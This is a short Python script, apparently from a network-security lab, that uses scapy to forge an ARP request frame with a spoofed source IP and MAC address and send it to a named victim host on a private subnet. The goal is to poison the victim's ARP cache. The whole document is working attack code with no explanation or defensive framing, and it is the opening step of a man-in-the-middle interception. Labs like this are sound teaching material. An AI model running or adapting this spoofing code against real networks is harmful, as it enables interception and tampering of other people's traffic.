#!/usr/bin/python3
from scapy.all import *

IP_victim    = "192.168.56.140" 
MAC_victim   = "00:0c:29:f7:3b:20" 

IP_spoofed      = "192.168.56.2" 
MAC_spoofed     = "00:0c:29:cc:f6:9d" 

print("SENDING SPOOFED ARP REQUEST......")

ether = Ether()
ether.dst = MAC_victim
ether.src = MAC_spoofed

arp = ARP()
arp.psrc  = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst  = IP_victim
arp.op = 1
frame = ether/arp
sendp(frame)

